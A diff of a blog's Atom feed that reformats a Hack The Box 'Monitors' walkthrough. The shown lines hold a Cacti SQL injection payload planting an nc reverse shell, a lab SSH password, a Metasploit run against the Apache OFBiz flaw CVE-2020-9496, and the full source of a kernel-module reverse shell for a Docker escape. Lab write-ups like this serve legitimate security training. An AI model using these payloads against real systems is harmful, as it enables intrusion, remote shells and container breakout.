@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-05-13T10:56:39+01:00</updated><id>/feed.xml</id><title type="html">EntrophyBlog</title><subtitle></subtitle><author><name>Entrophy</name></author><entry><title type="html">Monitors</title><link href="/htb/monitors/" rel="alternate" type="text/html" title="Monitors" /><published>2021-05-13T00:00:00+01:00</published><updated>2021-05-13T00:00:00+01:00</updated><id>/htb/monitors</id><content type="html" xml:base="/htb/monitors/">&lt;h1 id=&quot;user&quot;&gt;User&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-05-13T11:13:24+01:00</updated><id>/feed.xml</id><title type="html">EntrophyBlog</title><subtitle></subtitle><author><name>Entrophy</name></author><entry><title type="html">Monitors</title><link href="/htb/monitors/" rel="alternate" type="text/html" title="Monitors" /><published>2021-05-13T00:00:00+01:00</published><updated>2021-05-13T00:00:00+01:00</updated><id>/htb/monitors</id><content type="html" xml:base="/htb/monitors/">&lt;h1 id=&quot;user&quot;&gt;User&lt;/h1&gt;
 
 &lt;p&gt;The first thing is to use nmap for scan ports :&lt;/p&gt;
 
@@ -130,73 +130,73 @@ define( 'DB_COLLATE', '' );
 I had to do it manually via burp :&lt;/p&gt;
 
 &lt;p&gt;Step  1:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-/cacti/color.php&quot;&gt;
-Step 2:
-```/cacti/host.php?action=reindex```
 
-and I obtained a reverse shell as `www-data`
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/cacti/color.php?action=export&amp;amp;header=false&amp;amp;filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth%3bupdate+settings+set+value%3d'rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+10.10.14.54+443+&amp;gt;/tmp/f%3b'+where+name%3d'path_php_binary'%3b--+-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
+&lt;p&gt;Step 2:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/cacti/host.php?action=reindex
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-Enumerating the system I found an interesting service called `cacti-backup.service` which points at `/home/marcus/.backup/backup.sh`. Just reading the content in order to obtain marcus ssh password!
+&lt;p&gt;and I obtained a reverse shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;&lt;/p&gt;
 
-`VerticalEdge2020`
+&lt;p&gt;Enumerating the system I found an interesting service called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cacti-backup.service&lt;/code&gt; which points at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/marcus/.backup/backup.sh&lt;/code&gt;. Just reading the content in order to obtain marcus ssh password!&lt;/p&gt;
 
-# Root
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VerticalEdge2020&lt;/code&gt;&lt;/p&gt;
 
-Running enumeration on the host it is possible to see a new port running locally, `8443`.
-So we do pivoting through ssh using `ssh -L 8443:localhost:8443 marcus@monitors.htb`
+&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;
 
-![](//assets/images/monitor/3.png)
+&lt;p&gt;Running enumeration on the host it is possible to see a new port running locally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8443&lt;/code&gt;.
+So we do pivoting through ssh using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -L 8443:localhost:8443 marcus@monitors.htb&lt;/code&gt;&lt;/p&gt;
 
-As we see the server runs tomcat version 9.0.31. After some research, I discovered that Tomcat is now part of Apache OfBiz, so I checked some vulnerabilities for also that framework and found `CVE-2020-9496`.
+&lt;p&gt;&lt;img src=&quot;//assets/images/monitor/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
+&lt;p&gt;As we see the server runs tomcat version 9.0.31. After some research, I discovered that Tomcat is now part of Apache OfBiz, so I checked some vulnerabilities for also that framework and found &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2020-9496&lt;/code&gt;.&lt;/p&gt;
 
-
-`use exploit/linux/http/apache_ofbiz_deserialization
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use exploit/linux/http/apache_ofbiz_deserialization
 set LHOST 10.10.x.x
 set RHOSTS 127.0.0.1
 set payload linux/x64/shell/reverse_tcp
 set forceexploit true
 run
-`
+&lt;/code&gt;&lt;/p&gt;
 
-and we got shell as root into the docker container (there is `.dockernev` ) . So now we need to evade the docker somehow.
-Checking the capabilities with linpeas we can notice that we have  `CAP_SYS_MODULE` which is really interesting. I followed different articles ( https://xcellerator.github.io/posts/docker_escape/, https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd) which mainly prove that, due to the fact that the kernel for the container is the same as the host, we can evade the container installing a module which interacts directly with the kernel.
+&lt;p&gt;and we got shell as root into the docker container (there is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dockernev&lt;/code&gt; ) . So now we need to evade the docker somehow.
+Checking the capabilities with linpeas we can notice that we have  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_MODULE&lt;/code&gt; which is really interesting. I followed different articles ( https://xcellerator.github.io/posts/docker_escape/, https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd) which mainly prove that, due to the fact that the kernel for the container is the same as the host, we can evade the container installing a module which interacts directly with the kernel.&lt;/p&gt;
 
-So I just created two files, `Makefile` and `reverse.c` :
+&lt;p&gt;So I just created two files, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Makefile&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse.c&lt;/code&gt; :&lt;/p&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Makefile&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Makefile
 
-&lt;p&gt;obj-m +=reverse.o
+obj-m +=reverse.o
 all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 clean:
-	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean&lt;/p&gt;
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;reverse.c&lt;/p&gt;
 
-&lt;p&gt;#include &amp;lt;linux/kmod.h&amp;gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reverse.c
+
+#include &amp;lt;linux/kmod.h&amp;gt;
 #include &amp;lt;linux/module.h&amp;gt;
-MODULE_LICENSE(“GPL”);
-MODULE_AUTHOR(“AttackDefense”);
-MODULE_DESCRIPTION(“LKM reverse shell module”);
-MODULE_VERSION(“1.0”);
-char* argv[] = {“/bin/bash”,”-c”,”bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.0.1/4444 0&amp;gt;&amp;amp;1”, NULL};
-static char* envp[] = {“PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin”, NULL };
+MODULE_LICENSE(&quot;GPL&quot;);
+MODULE_AUTHOR(&quot;AttackDefense&quot;);
+MODULE_DESCRIPTION(&quot;LKM reverse shell module&quot;);
+MODULE_VERSION(&quot;1.0&quot;);
+char* argv[] = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.0.1/4444 0&amp;gt;&amp;amp;1&quot;, NULL};
+static char* envp[] = {&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;, NULL };
 static int __init reverse_shell_init(void) {
 return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 static void __exit reverse_shell_exit(void) {
-printk(KERN_INFO “Exiting\n”);
+printk(KERN_INFO &quot;Exiting\n&quot;);
 }
 module_init(reverse_shell_init);
-module_exit(reverse_shell_exit);&lt;/p&gt;
+module_exit(reverse_shell_exit);
 
-&lt;p&gt;```&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;After having uploaded them onto the docker container, using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -o&lt;/code&gt;,  compile them through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make all&lt;/code&gt; command (if you encounter compilation problems and errors just run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export PATH=$PATH/usr/lib/gcc/x86_64-linux-gnu/8/&lt;/code&gt;) and then open a netcat listener on the host as marcus&lt;/p&gt;
 
